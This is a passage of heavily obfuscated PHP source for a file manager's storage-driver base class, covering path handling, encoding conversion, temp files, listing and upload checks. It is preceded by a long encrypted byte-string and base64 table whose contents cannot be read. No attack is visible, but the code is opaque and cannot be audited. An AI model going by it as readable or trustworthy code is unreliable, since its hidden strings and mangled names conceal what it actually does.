8a\x82\x13\xd7\x33\x72\x34\x6a\x72\x79\xa\xbe\xa7\xd2\x2b\x54\x81\x5d\x3\x49\xdb\x1c\xaf\x7a\xc4\xe9\x97\x64"."\x47\x43\x92\x8f\x72\x14\x93\x9c\xd1\x4b\x84\x9f\x7f\x8a\xc2\x29\x46\x95\xd6\x4c\x23\x93\xa5\x4\x92\xbf\x12\xf1\xe8\x91\xea\x49\xa6\x20\x44\x90\x91\x28\xf5\xf3\xcb\x15\xf\x49\xc7\xac\x4b\x14"."\x99\x62\x62\xe6\x22\xb8\x2\xe2\xf3\x5\xf7\xc0\x96\xd3\x50\xb5\xd8\x8f\xb0\xe8\x99\x5c\x84\x7c\xb3\xac\x8\x4d\xc3\x44\x8b\xf0\x9c\x22\xa7\xd8\xd8\xcb\x7c\x37\x9b\xb6\x4a\x29\x15\x3e\x45\x92"."\244\21\115\161\377\121\60\72\142\220\40\141\114\147\152\231\376\51\123\375\323\230\107\62\331\127\23\160\15\200\267\321\136\220\226\1\146\260\30\332\0\245\106\310\47\362\230\322"."\x15\x15\xf1\xa6\x22\x7c\x48\x10\xc7\x31\x7c\x3e\x89\x87\x19\x1e\xb3\xa4\xb3\x5b\xe7\xa\x8f\xc4\xd5\x8a\x8c\x46\x85\x26\x1\xd5\x83\xc4\x19\xba\x2b\xa5\xd3\x11\xc2\xc9\xad\x2e\xcd\x55\x4f\x6"."\xb4\x33\xdc\xe9\xe0\x78\x5e\x34\x86\x7a\x7b\x31\x5d\xfa\x46\x9e\x4a\xe0\x51\x3\xd9\xa1\x3e\x29\x25\xfa\x21\xd4\x77\x11\xc8\xa4\xee\xed\xa5\x81\x11\x1a\x11\xd4\x9\xd\xd3\x43\xe6\x78\x49\x80"."\223\46\7\226\153\125\4\270\36\66\30\345\302\253\240\65\265\330\50\327\45\307\352\30\343\246\223\130\347\11\37\212\134\137\325\226\43\54\225\57\116\333\25\241\72\136\256\322"."\x1c\xc4\x73\x8d\xe8\xcc\xbe\x96\xc9\x5b\xba\xda\xbb\x82\x1c\xd4\xcc\xb7\x27\x65\xd5\x85\xef\xab\x16\xa6\x48\x25\x9e\xb2\x1f\xc9\x1b\x29\x25\x1a\x5b\x18\x69\x9\x45\x5b\x23\x89\xc5\x4a\x46\x77"."\24\241\376\101\36\245\160\157\145\42\124\244\3\317\126\165\77\177\37\1\7\375\375\210\102\367\247\71\27\143\13\176\105\322\164\223\36\242\162\127\113\327\237\156\225\325\130\300"."\146\63\271\262\62\130\124\132\41\167\116\310\20\245\314\105\113\57\317\77\246\223\267\350\105\213\245\2\245\12\255\201\374\225\277\100\36\261\220\163\43\302\103\57\214\327\170\243"."\60\154\330\206\330\370\254\304\230\134\173\250\265\43\322\251\206\242\321\330\62\227\106\240\20\22\133\374\311\220\264\374\302\210\64\63\142\22\350\327\313\135\262\201\103\53\331\321"."\xbb\x47\x6c\x41\xa7\x4f\x76\xcd\x57\x64\x57\x1e\xf0\xa4\x22\x7f\x70\x80\x46\xa5\xe7\x82\x8a\x96\x66\xd8\xba\x4\xa0\xaf\xd8\xd4\x81\x95\x8a\x96\xcb\xb9\x1e\xa\xcc\xd\x48\xd1\x92\xfb\x64\xad".base64_decode('+CmVfoDBJO9/lTLE8Qvw/+umGmnhhctIM80LblRI3yJokR+VZN8sexLpGx9X8kn+')."\176\210\237\42\366\306\233\111\330\17\240\215\51\54\22\123\251\223\36\361\11\304\30\133\143\105\371\226\56\230\16\362\41\246\1\354\154\60\314\256\206\160\104\60\2\70\73\324".base64_decode('hj9H2UPE9WIhF2MZmIYnwhMwzq5bas8zUV5lWNe77GXfIC8S0LQe3B2Us090DsX4')."\373\42\242\250\67\245\102\3\120\262\42\144\110\74\203\322\250\324\323\27\313\370\213\21\312\74\146\42\55\76\100\334\203\205\363\105\307\305\72\267\313\132\357\322\334\120\0\241"."\x74\x4\x6b\x84\xf5\x87\xcc\xfc\x58\x19\xc0\x25\x38\x8a\xb2\x76\x71\x85\x43\xfc\x5e\x46\x61\xc0\x94\xc7\x8f\x20\x64\x6c\xc2\x40\xdf\x1d\xa4\x3c\xba\xf\xf1\x36\xba\x53\xfe\xec\x10\x2d\xfe\xff"."\245\40\115\114\110\152\230\356\112\312\33\144\173\217\72\101\166\341\27\225\262\346\210\373\361\101\14\361\276\241\344\172\75\111\332\64\304\222\127\176\357\311\135\310\127\366\156\211"."\102\136\225\125\320\122\207\131\304\256\240\30\17\110\62\113\237\236\104\177\172\341\227\35\147\336\106\120\104\5\237\254\345\213\252\45\153\344\322\26\127\210\21\200\16\135\60\346"."\244\24\326\11\321\330\353\271\344\51\266\126\206\223\341\251\224\112\257\154\141\127\177\356\267\137\304\223\72\342\354\164\77\72\302\257\165\155\261\31\154\307\365\250\115\322\114\152"."\x19\x1f\xa5\xc8\x30\x56\x13\xb1\xe6\x31\x39\x2c\x2b\xc1\x92\x5e\xa0\x44\x26\x3c\x4b\xf3\xf9\x9e\x2f\x65\x60\x6f\xd9\xa5\x7d\xe4\xa1\x35\x8a\xea\xbc\x6f\xb1\x48\x3b\x8d\xe3\x4f\xb9\x74\x26\x67".base64_decode('9mu5ONUjcxm8WIib4rqhrmwUFNSKRXEBJR+Z6F+XxSGkdSfbVWI3r9J76oRYc9LV').base64_decode('FQXCNVapEKFSfxfUkvg8WYGZXtgJ0zbIjtrZRW/oYMDkKtmtKRdBt0mvrAfLb1mx')."\x86\x1c\x60\x14\x59\x81\x14\xae\xb9\x3\x32\x23\x6\x19\x94\x79\x8a\x58\x1a\xae\x8d\x8c\x97\x12\xa2\x86\x7d\x24\x40\x30\x85\x4c\xb8\x7f\xd\x94\xaf\x60\xf7\x3b\x3f\x74\xa9\x93\x9f\x56\x7d\x80"."\163\61\70\56\116\163\331\331\207\320\251\360\76\125\307\76\303\137\332\363\321\236\211\27\126\351\273\172\76\376\206\236\217\172\224\364\301\313\171\76\141\242\370\165\117\5\11\103"."\x3a\xf7\x8b\xcb\xb8\xcd\x5c\xe3\xb2\x8c\x9d\xf0\x72\x12\x7c\xa8\x3c\x5\xe2\xde\x81\x4b\x9a\xe5\x32\x56\x71\xb7\x5c\x28\xe5\xc5\x1d\x3d\x8a\xb8\x39\xab\xb2\xe\x4b\x3d\x2c\x59\x39\x1f\xb9\x59"."\367\61\167\170\236\341\20\275\222\147\246\302\30\176\163\35\124\361\226\260\113\151\67\276\152\230\327\157\261\333\111\157\66\303\265\352\124\113\27\326\65\324\277\151\31\152\137\221"._kodDe('Lj8/Jo1+U4Yc4wCeE7Di8EctTI3yVhFhTBefKXWFRR3nZDk02y+H2WHNsavvH4Vu2A==')."\x9a\x55\xd2\x50\x2e\x7f\x2a\xb8\x6c\x4\xc8\x22\x94\x74\x77\xa4\xa3\xcc\xa3\xa8\x61\x62\x4d\xa\x5b\x6c\x1f\x7a\x78\x89\x87\x2d\xdd\xdf\xa2\x7\x7f\x85\x7e\x48\x27\x96\xd8\x9\xf4\xdd\x41\x33"."\x87\xb9\xe3\x3c\x96\x72\x3b\x96\xe6\x66\x5\x2b\x71\x3c\x64\x24\x18\x7b\x65\x90\xe7\xbf\x75\x6f\xdb\xc9\xc0\x80\x1c\x44\x24\x4b\x2c\x91\x5c\xa3\x63\x7a\x85\x38\xb8\x38\x3e\xd1\x88\xc\x31\x56"."\310\301\201\213\115\257\305\236\222\120\312\377\142\2\31\167\103\31\41\241\246\123\241\347\301\5\14\157\124\170\127\122\322\172\370\232\166\123\272\214\163\162\176\315\361\113\13\122"."\x12\xfc\xe9\x4e\x8c\x4c\x30\xd0\x2d\x82\xe1\x74\xf7\xd5\x53\x3d\x2a\x26\xea\xe8\xf3\x29\xe3\x65\x2a\x27\xce\xa4\xe7\x27\x85\x73\x2e\x89\x2c\xc3\xa5\x99\x19\xe6\x38\xfc\x3a\x43\x4e\xf2\xc3\x9a"."\x4e\x56\x30\x1e\x74\x87\xba\x76\xab\xe4\xaa\x58\xb6\x4d\x23\x15\xc9\xdb\xa0\xbc\x6a\xe9\x9d\x41\x21\xc2\x21\x32\x1f\xe8\x4\xec\x61\xe2\x7f\x94\xd8\x27\x86\x16\x72\x9b\x45\x4d\x52\xad\x72\xcb"."\x95\xf0\xe8\x4a\x4f\xcb\x9a\x72\x58\x8c\x3a\xc6\xe7\x31\xe6\x0\x16\x7d\xdd\xc5\x17\xa2\x78\xab\xe7\xd9\x61\x82\x95\xbc\x6f\x11\xb3\x21\x22\xa8\x40\x60\x39\xc9\xf4\xd5\xc5\x84\xf0\xb7\xd8\x5c"."\114\211\355\175\156\21\221\146\262\23\147\24\345\233\0\216\123\100\207\104\207\235\176\115\72\55\305\301\50\102\235\245\274\210\110\302\130\302\377\360\104\227\205\60\166\62\345\331"."\xf9\xcc\xee\xd8\xf6\x3c\xbe\x4a\xdd\xeb\xd2\x30\x23\xd3\xff\x7f\xbf\x2f\xf8\x7f\xeb\x59\xc1\x19\xf5\x4c\x6c\xee\x7a\xbc\x78\x21\x10\xcb\x8c\x3e\x5b\x2d\xb9\xf0\xa6\x22\x5b\x4f\x3f\xdc\x87\xe6"."\4\130\105\374\235\156\51\316\25\165\231\243\61\346\177\114\143\127\105\132\56\47\35\255\225\331\213\262\127\137\321\342\33\342\117\206\126\212\170\15\342\274\57\300\366\260\267\324"."\311\343\256\175\225\62\12\314\303\271\230\12\353\230\202\30\361\132\50\277\331\305\363\25\165\73\300\226\210\214\262\154\342\253\210\26\141\76\333\202\54\224\302\14\33\361\237\0"."\xe3\x25\x5b\xc2\xc6\x8a\x8c\xb5\xab\x5\xcc\xde\xb7\x80\xa1\x23\x62\x57\xf\x58\x49\xc6\x44\x2e\x50\x19\xfe\x4a\xba\x66\xc1\x5\x94\x7\x18\x66\xd\x1b\x12\xb3\x9\x74\x95\xe8\xf0\xbc\x60\x49"."\x33\xd9\xf2\x68\xba\x84\xeb\xe5\x17\xfd\xe5\xa5\xf9\xce\x97\x8b\x60\x8d\x68\xb7\xbc\x89\xbf\x5a\x5e\xef\x7d\xc6\x7c\x8a\xbf\xfc\x63\xd4\x20\x1\x8b\x3c\xe2\x58\xc8\xc0\xc4\x46\xe4\xfe\x85\x5c"."\x7c\x56\x28\x43\x57\x6a\x42\xe4\x19\x67\xaf\x54\xde\xb1\xfc\xe5\x50\x21\x43\xc3\x21\xb9\xbf\x6c\xe7\x77\x59\x26\x21\xe8\xdc\x50\x2e\x78\x91\xd4\x52\xa5\x77\xb5\x27\x5\xca\xce\x17\x86\xed\x5c".base64_decode('Q464LHHBZ5jECz4r2t1RQ2xrYMUiJqHNFHMvPVqN95TwD4m9eRFZn3xqM3M3SVsc')."\x40\x2e\x89\x9c\x2d\x3f\x38\xe2\x2e\x89\xf5\xff\xdd\x7b\x69\x7e\xa5\x6c\x29\xd3\xb2\xa5\x6c\x1c\x5e\x29\x2f\x5e\x61\xb2\xc4\x41\x4e\xc3\xf\xc\x3b\xae\xb9\x10\xf\x1a\x78\x1f\x32\x20\x7c\x38"."\145\255\135\34\66\334\301\312\40\351\212\22\21\333\151\367\313\50\44\221\200\231\53\121\250\101\272\144\163\337\161\162\367\355\145\230\262\144\104\245\144\122\212\171\250\103\277\330"."\44\60\42\374\116\220\144\172\175\20\222\336\256\366\226\162\277\171\56\335\210\246\310\312\13\227\137\172\211\273\70\211\316\140\305\60\47\44\216\0\17\274\322\253\335\3\332\260"."\x20\x92\x4\x2d\x9e\x4e\xb7\x69\xc3\x15\xb2\xa6\x19\x37\xc2\xa1\x8\xc2\xb3\x12\x22\x4b\xb2\x32\x16\xca\xeb\xfa\x88\xf7\x19\xe3\x80\x6c\x99\xec\xca\x58\xe\x15\x56\xc8\x52\x79\x71\xfd\x21\xba"."\x89\x61\x95\xba\x4f\x36\x9a\xbb\xb8\x6c\xe5\xcc\x17\x95\x0\xd1\xb7\x2d\xb8\xbe\x94\xc4\xf7\x60\x23\xc\xa1\x48\x45\xbb\xc2\x99\x78\xf1\x49\xb7\x4d\x35\xcf\xc6\xe7\xc\xe5\x21\x26\x2f\x7e\x17"."\xd4\xc3\xc9\x61\x91\x8\xa3\x18\x3c\x49\x20\x41\x90\xaa\xaf\x28\x68\x90\x96\x80\x9e\x8b\x4a\xd5\xc9\x97\xa0\xe3\x16\x48\x54\xfe\x88\x58\x95\xee\x21\x96\x8c\xd1\x45\x2\x3b\xea\x4c\xd7\xe0\x4b".base64_decode('KJJ3DHLG5URXc7xTS5gQsXwpME8EsDQt5E6i+XVP6+UC3p7REvaI4aSyEmdUnlgO').base64_decode('t8oGFT5Uub3eVrEx9fKLopKy9kiaFEmzQhnaoorFaBIuKchVV9lxhgCXpUm4bFky').base64_decode('KyyJV6Ryjlayx+le+eCBzCFdocMezpxmHW88K2Yu/xysOG9uIqSo3AohW/DcaFdq')."\x45\xc5\xcc\xe3\xb6\x42\xe4\xf6\x9c\x2\x95\x70\x2d\x4b\xa9\x80\x5d\x85\x6a\x43\x39\x1e\x17\x69\x15\x14\x2d\x68\x9d\xf8\x8c\x96\x1d\x53\x55\x48\x96\xb5\x36\x2a\xeb\x75\xc4\x2b\x6e\x7d\xdb\xad".base64_decode('cOGBywMDDk6BuoLVhjjFnDEkdNCY/vgkF34vFYYKJj8z0kI/EOs2hyzvQJbV5l6n')."\x85\x92\xe4\x33\xb6\xa2\x3a\xbb\xf\xf3\xf5\x65\x1c\xb4\x78\xc7\x85\xc6\x8b\x39\xf6\xe0\xa4\x6c\x17\x40\x59\x20\xd3\x31\x52\xba\xdb\x51\xad\xec\xaf\x8a\xa6\xb3\x8f\xe6\x24\x59\xa1\x47\x4c\x27".base64_decode('pA4uBYEKgiwCAjpPiMNpfRIFI9aIyx6D0g1wRUBvF1vwLTa/VyJOVuk5S5MTpuX4')."\160\132\322\54\222\337\146\323\161\304\155\73\145\363\11\161\210\17\113\237\244\114\202\102\342\22\11\67\212\334\116\220\145\114\320\15\11\302\75\47\346\237\23\72\115\45\110\312".base64_decode('FcG3Hjwin4Vw39lW8tzICgBiVvvNUebCEpt1i/bgiwppyAS9AstRVochBvN2kKYE')."\341\351\3\277\206\11\107\170\177\55\60\130\314\270\212\323\127\254\270\232\350\327\325\0\122\125\121\5\365\173\116\144\137\140\70\223\110\46\312\222\272\102\211\304\262\130\274\225"."\272\111\57\113\46\245\44\365\242\262\244\256\366\130\347\170\151\341\216\120\44\132\226\206\65\221\72\125\341\142\214\46\105\272\110\53\311\165\336\170\255\210\264\54\26\55\41\27"."\307\102\130\137\314\232\114\6\317\56\63\22\132\216\161\355\222\25\250\236\27\276\345\104\231\202\221\32\22\302\76\115\42\346\155\346\4\222\7\334\357\17\171\24\376\330\42\205"."\x8a\xb0\x16\x51\x27\xd4\x1d\x2f\x2\x14\xbb\x8d\xe7\x7b\x9d\x13\xd6\xe2\x26\x3c\xe0\xba\x31\x97\xe0\x64\x3f\x10\x84\x23\xad\x39\xf9\xe0\x25\x80\xba\x8a\x3\x24\xb\x7a\xcb\x2f\x1e\x48\xaa\x18"."\0\334\260\105\46\250\240\15\232\375\322\305\2\145\153\300\46\23\206\124\322\24\243\141\127\262\243\145\52\136\34\123\351\36\336\361\102\356\366\177\0\321\230\173\375\34\253\0"."\0".base64_decode('').strrev(''), 10, -8))); goto B®™¿®Ò§; AŠåù¸™Õß: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ ·«²ƒ =& $_SERVER[­õöî’–]; $this->objectDriver = array($ ·«²ƒ[60], $ ·«²ƒ[61], $ ·«²ƒ[62], $ ·«²ƒ[63], $ ·«²ƒ[64], $ ·«²ƒ[65], $ ·«²ƒ[66], $ ·«²ƒ[67], $ ·«²ƒ[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($«Ó´¾÷É) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($«Ó´¾÷É, $_SERVER[­õöî’–][8]); } return $«Ó´¾÷É; } public function iconvApp($ „•¢˜‹) { return $ „•¢˜‹; } public function iconvSystem($™©ü¡„İ) { return $™©ü¡„İ; } public function iconvTo($œ¥İ¥á, $‘Œ„š¸ì, $¨¢£ñ£Á) { $‡À†£–ş =& $_SERVER[­õöî’–]; if (!$œ¥İ¥á || !function_exists($‡À†£–ş[69])) { return $œ¥İ¥á; } static $‰ÂÛÍ® = array(); $Ê¡àæï = $‘Œ„š¸ì . $‡À†£–ş[70] . $¨¢£ñ£Á . $‡À†£–ş[71] . $œ¥İ¥á; if (isset($‰ÂÛÍ®[$Ê¡àæï])) { return $‰ÂÛÍ®[$Ê¡àæï]; } if (function_exists($‡À†£–ş[72])) { $àÒÚš–º = @mb_convert_encoding($œ¥İ¥á, $¨¢£ñ£Á, $‘Œ„š¸ì); } else { $àÒÚš–º = @iconv($‘Œ„š¸ì, $¨¢£ñ£Á, $œ¥İ¥á); } $àÒÚš–º = $àÒÚš–º ? $àÒÚš–º : $œ¥İ¥á; if (strstr($àÒÚš–º, $‡À†£–ş[73])) { $àÒÚš–º = str_replace($‡À†£–ş[73], $‡À†£–ş[11], $àÒÚš–º); } $‰ÂÛÍ®[$‘Œ„š¸ì . $‡À†£–ş[70] . $¨¢£ñ£Á . $‡À†£–ş[71] . $œ¥İ¥á] = $àÒÚš–º; $‰ÂÛÍ®[$¨¢£ñ£Á . $‡À†£–ş[70] . $‘Œ„š¸ì . $‡À†£–ş[71] . $œ¥İ¥á] = $œ¥İ¥á; $‰ÂÛÍ®[$¨¢£ñ£Á . $‡À†£–ş[70] . $‘Œ„š¸ì . $‡À†£–ş[71] . $àÒÚš–º] = $œ¥İ¥á; $‰ÂÛÍ®[$‘Œ„š¸ì . $‡À†£–ş[70] . $¨¢£ñ£Á . $‡À†£–ş[71] . $àÒÚš–º] = $àÒÚš–º; return $àÒÚš–º; } public function getPathInner($­ƒÓşó) { $ÇÜß’»Œ = IO::init($­ƒÓşó); return $ÇÜß’»Œ->path; } public function getPathOuter($ÉŞªí©ô) { $ÒñŸ‡Œé =& $_SERVER[­õöî’–]; $¹”“†×• = strlen(trim($this->pathBase, $ÒñŸ‡Œé[8])); $ÉŞªí©ô = substr(trim($ÉŞªí©ô, $ÒñŸ‡Œé[8]), $¹”“†×•); return $this->pathDriver . $ÒñŸ‡Œé[8] . ltrim($ÉŞªí©ô, $ÒñŸ‡Œé[8]); } public function isParentOf($ôíŞ´‚¯, $ÄşÇåƒÙ) { $¾èêÄŸİ =& $_SERVER[­õöî’–]; $ôíŞ´‚¯ = rtrim(strtolower($ôíŞ´‚¯), $¾èêÄŸİ[8]) . $¾èêÄŸİ[8]; $ÄşÇåƒÙ = rtrim(strtolower($ÄşÇåƒÙ), $¾èêÄŸİ[8]) . $¾èêÄŸİ[8]; $ğãªóğ = strpos($ÄşÇåƒÙ, $ôíŞ´‚¯) === 0; return $ğãªóğ; } public function getType() { $Ñª‚ÓæÔ =& $_SERVER[­õöî’–]; $‡³ªÒëÜ = str_replace($Ñª‚ÓæÔ[74], $Ñª‚ÓæÔ[12], get_class($this)); return strtolower($‡³ªÒëÜ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($“Ö¿«–ˆ, $à”Ş˜±Ù) { $¢Ñé æ• =& $_SERVER[­õöî’–]; $àÜ˜Ñ†ˆ = rtrim($“Ö¿«–ˆ, $¢Ñé æ•[8]) . $¢Ñé æ•[8] . $à”Ş˜±Ù; $»î£œĞä = $this->exist($àÜ˜Ñ†ˆ); return $»î£œĞä ? $àÜ˜Ñ†ˆ : !1; } public function setModifyTime($ô‹±‰¨, $Ÿ©ßË¸Ì = '') { } public function renameObject($Ñ¤Â¯±, $ éó¡ ) { $ëãÒö±í = $ éó¡ ; $Ñ¤Â¯± = $this->getPathOuter($Ñ¤Â¯±); $ éó¡  = $this->pathFather($Ñ¤Â¯±) . $ éó¡ ; $Ä‰ª±ñ‡ = IO::copy($Ñ¤Â¯±, $this->pathFather($Ñ¤Â¯±), REPEAT_RENAME_FOLDER, $ëãÒö±í); if ($Ä‰ª±ñ‡) { IO::remove($Ñ¤Â¯±); } return $Ä‰ª±ñ‡ ? $ éó¡  : !1; } public function tempFile($ñ¡‹ÓÔ± = '', $§­•ìÔö = '') { if (!$ñ¡‹ÓÔ±) { $ñ¡‹ÓÔ± = rand_string(15); } $ø²³èšî = TEMP_FILES . rand_string(15) . $_SERVER[­õöî’–][8]; @mkdir($ø²³èšî, DEFAULT_PERRMISSIONS, !0); $ç¶£»™Á = $ø²³èšî . $ñ¡‹ÓÔ±; @touch($ç¶£»™Á); if ($§­•ìÔö) { file_put_contents($ç¶£»™Á, $§­•ìÔö); } return $ç¶£»™Á; } public function tempFileRemve($¶üµÉŞ”) { @unlink($¶üµÉŞ”); @rmdir($this->pathFather($¶üµÉŞ”)); } public function mkfile($¿Ê•«„õ, $¥¨š£Œ÷ = '', $ÇŸ¼¨ıè = REPEAT_RENAME) { } public function mkdir($­•à¤Ü“, $ö¬œë®¨ = REPEAT_SKIP) { } public function delFile($£ïŒŸáª) { } public function delFolder($êı÷¢Ì•) { } public function copyFile($şÅ†ÏÔ, $¸ó¬Í´) { } public function moveFile($î°ñúÛ¥, $ğ¸îªÇ) { } public function remove($åƒ¾¾öñ) { if ($this->isFile($åƒ¾¾öñ)) { return $this->delFile($åƒ¾¾öñ); } return $this->delFolder($åƒ¾¾öñ); } public function rename($âõÆåŠ, $û‚´œø¶) { } public function exist($ÄÁĞ³Ø”) { } public function findByHash($ığŒ¸ïÜ = '', $õõ¨â…Ê = '') { return !1; } public function isFile($øÂá¿ÑÒ) { } public function isFolder($™’ÒñÉµ) { } public function size($Ş»ù·ú) { } public function info($Œ‚øé­†) { } public function infoSimple($âÊÚŸ) { return $this->info($âÊÚŸ); } public function infoAuth($‹ñ†ºğş) { return $this->info($‹ñ†ºğş); } public function infoFull($²Î‹Á·‡) { return $this->info($²Î‹Á·‡); } public function infoWithChildren($‰‰Ô‚¡) { $ëüË¡½ˆ =& $_SERVER[­õöî’–]; static $®®şìÀŸ = array(); if (isset($®®şìÀŸ[$‰‰Ô‚¡])) { return $®®şìÀŸ[$‰‰Ô‚¡]; } $Å¹²¢‹± = $this->info($‰‰Ô‚¡); if ($Å¹²¢‹± && $Å¹²¢‹±[$ëüË¡½ˆ[33]] == $ëüË¡½ˆ[75]) { $¯›šô“× = array($ëüË¡½ˆ[76] => 0, $ëüË¡½ˆ[77] => 0, $ëüË¡½ˆ[78] => 0); $this->infoChildren($‰‰Ô‚¡, $¯›šô“×); $Å¹²¢‹±[$ëüË¡½ˆ[76]] = $¯›šô“×[$ëüË¡½ˆ[76]]; $Å¹²¢‹±[$ëüË¡½ˆ[79]] = array($ëüË¡½ˆ[80] => $¯›šô“×[$ëüË¡½ˆ[77]], $ëüË¡½ˆ[81] => $¯›šô“×[$ëüË¡½ˆ[78]]); $®®şìÀŸ[$‰‰Ô‚¡] = $Å¹²¢‹±; } return $Å¹²¢‹±; } public function listPath($›Ô–Í’í, $óîÕ­©¢ = false) { } public function has($æ²˜îìã, $úÒ·Ã§ = false, $¾üäÓ¡µ = false) { } public function canRead($ìè¬¤) { } public function canWrite($¼ò¡ÖÑĞ) { } public function getContent($„°öø) { } public function setContent($˜÷, $ÃçÉ´“Ë = '') { } protected function infoChildren($º»œì¿µ, &$Û†ˆ¬ëˆ) { $¯çÒ²ÁÄ =& $_SERVER[­õöî’–]; check_abort_echo(); $ÀíÏŠ½ = $this->listPath($º»œì¿µ, !0); $ÀíÏŠ½ = array_merge($ÀíÏŠ½[$¯çÒ²ÁÄ[82]], $ÀíÏŠ½[$¯çÒ²ÁÄ[83]]); foreach ($ÀíÏŠ½ as $Ôµğ£ä×) { if ($Ôµğ£ä×[$¯çÒ²ÁÄ[33]] == $¯çÒ²ÁÄ[75]) { $Û†ˆ¬ëˆ[$¯çÒ²ÁÄ[78]]++; $‹Íœáò = $this->getPathInner($Ôµğ£ä×[$¯çÒ²ÁÄ[84]]); $this->infoChildren($‹Íœáò, $Û†ˆ¬ëˆ); } else { $Û†ˆ¬ëˆ[$¯çÒ²ÁÄ[77]]++; $Û†ˆ¬ëˆ[$¯çÒ²ÁÄ[76]] += $Ôµğ£ä×[$¯çÒ²ÁÄ[76]]; } } } public function fileSubstr($ä¸¡®, $•½ù“Ã, $—”È˜Ñ) { } public function listAll($ƒÕ¿à³¹) { } public function listAllMake($£á‘£’ˆ, &$Ü„˜©ì¢) { $„Û€ó¢ş =& $_SERVER[­õöî’–]; check_abort_echo(); $ş¬¸é½“ = $this->listPath($£á‘£’ˆ, !0); if (!$ş¬¸é½“) { return; } $É«—£“Ø = array_merge($ş¬¸é½“[$„Û€ó¢ş[82]], $ş¬¸é½“[$„Û€ó¢ş[83]]); foreach ($É«—£“Ø as $‹¥œ·ëà) { $ŞÙåÍùÃ = $‹¥œ·ëà[$„Û€ó¢ş[33]] == $„Û€ó¢ş[75]; $ù€Ãàñ¡ = array($„Û€ó¢ş[84] => $‹¥œ·ëà[$„Û€ó¢ş[84]], $„Û€ó¢ş[75] => $ŞÙåÍùÃ); if (isset($‹¥œ·ëà[$„Û€ó¢ş[76]])) { $ù€Ãàñ¡[$„Û€ó¢ş[76]] = $‹¥œ·ëà[$„Û€ó¢ş[76]]; } if (isset($‹¥œ·ëà[$„Û€ó¢ş[85]])) { $ù€Ãàñ¡[$„Û€ó¢ş[85]] = $‹¥œ·ëà[$„Û€ó¢ş[85]]; } if (!$ŞÙåÍùÃ) { $Ü„˜©ì¢[] = $ù€Ãàñ¡; continue; } $Ü„˜©ì¢[] = $ù€Ãàñ¡; $ëê£Ğå = $‹¥œ·ëà[$„Û€ó¢ş[84]]; $Î´Ÿ»¥³ = $this->pathDriver; if (substr($‹¥œ·ëà[$„Û€ó¢ş[84]], 0, strlen($Î´Ÿ»¥³)) == $Î´Ÿ»¥³) { $ëê£Ğå = substr($ëê£Ğå, strlen($Î´Ÿ»¥³)); } $this->listAllMake($ëê£Ğå, $Ü„˜©ì¢); } } public function listAllSimple($öÌš”¤˜) { $ŒÂã¯¸œ =& $_SERVER[­õöî’–]; $ñÆœÊÂ¦ = array(); $‹Ğ¼Š™È = $this->listAll($öÌš”¤˜); $Û¶ßÏì¦ = $this->getPathOuter($öÌš”¤˜); foreach ($‹Ğ¼Š™È as $‚Ş®Í©×) { $äÎÅ”‰÷ = $‚Ş®Í©×[$ŒÂã¯¸œ[84]]; $’øüÅÑÎ = $‚Ş®Í©×[$ŒÂã¯¸œ[84]]; if (isset($‚Ş®Í©×[$ŒÂã¯¸œ[86]])) { $äÎÅ”‰÷ = $‚Ş®Í©×[$ŒÂã¯¸œ[86]][$ŒÂã¯¸œ[84]]; $‚Ş®Í©×[$ŒÂã¯¸œ[76]] = $‚Ş®Í©×[$ŒÂã¯¸œ[86]][$ŒÂã¯¸œ[76]]; $‚Ş®Í©×[$ŒÂã¯¸œ[85]] = $‚Ş®Í©×[$ŒÂã¯¸œ[86]][$ŒÂã¯¸œ[85]]; } else { $’øüÅÑÎ = substr($‚Ş®Í©×[$ŒÂã¯¸œ[84]], strlen(get_path_father($Û¶ßÏì¦))); $’øüÅÑÎ = $ŒÂã¯¸œ[8] . ltrim($’øüÅÑÎ, $ŒÂã¯¸œ[8]); } $õ·§Ä¼« = array($ŒÂã¯¸œ[84] => $’øüÅÑÎ, $ŒÂã¯¸œ[75] => $‚Ş®Í©×[$ŒÂã¯¸œ[75]]); if (isset($‚Ş®Í©×[$ŒÂã¯¸œ[76]]) && !$‚Ş®Í©×[$ŒÂã¯¸œ[75]]) { $õ·§Ä¼«[$ŒÂã¯¸œ[76]] = $‚Ş®Í©×[$ŒÂã¯¸œ[76]]; } if (isset($‚Ş®Í©×[$ŒÂã¯¸œ[85]])) { $õ·§Ä¼«[$ŒÂã¯¸œ[85]] = $‚Ş®Í©×[$ŒÂã¯¸œ[85]]; } if (!$‚Ş®Í©×[$ŒÂã¯¸œ[75]]) { $õ·§Ä¼«[$ŒÂã¯¸œ[87]] = $äÎÅ”‰÷; } $ñÆœÊÂ¦[] = $õ·§Ä¼«; } return $ñÆœÊÂ¦; } public function upload($áûçªë‰, $„ÕèİóŒ, $á¼êŠ¾™ = false, $ã˜¨ê¾“ = REPEAT_REPLACE) { } public function uploadFileByID($íÇÅ½ĞÌ, $ÆŠµö ª, $›üŠ¨‹ã) { } public function uploadFileByPath($¨òãµÔ, $éóœö„, $¤Şë¿— = array()) { } public function isUploadServer() { $î°°Ï‚° =& $_SERVER[­õöî’–]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $î°°Ï‚°[88]) { return !0; } return $GLOBALS[$î°°Ï‚°[6]][$î°°Ï‚°[89]][$î°°Ï‚°[90]]; } public function isFileOutServer() { $‚æé¸´¤ =& $_SERVER[­õöî’–]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $‚æé¸´¤[88]) { return !0; } return $GLOBALS[$‚æé¸´¤[6]][$‚æé¸´¤[89]][$‚æé¸´¤[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Ô§çÔ¿£) { $÷×Æ‘Å =& $_SERVER[­õöî’–]; if (!$this->isCdnHost()) { return $Ô§çÔ¿£; } return str_replace(trim(get_url_root($Ô§çÔ¿£), $÷×Æ‘Å[8]), trim($this->cdnHost, $÷×Æ‘Å[8]), $Ô§çÔ¿£); } public function uploadLink($—ÍÅ± û, $º®÷ïæ = 0) { $Ì™«ÊøÌ =& $_SERVER[­õöî’–]; if ($this->isUploadServer()) { return; } $¢Š×¾øĞ = $this->getType(); if (!in_array($¢Š×¾øĞ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $™áˆ±§­ = 1024 * 1024 * 10; 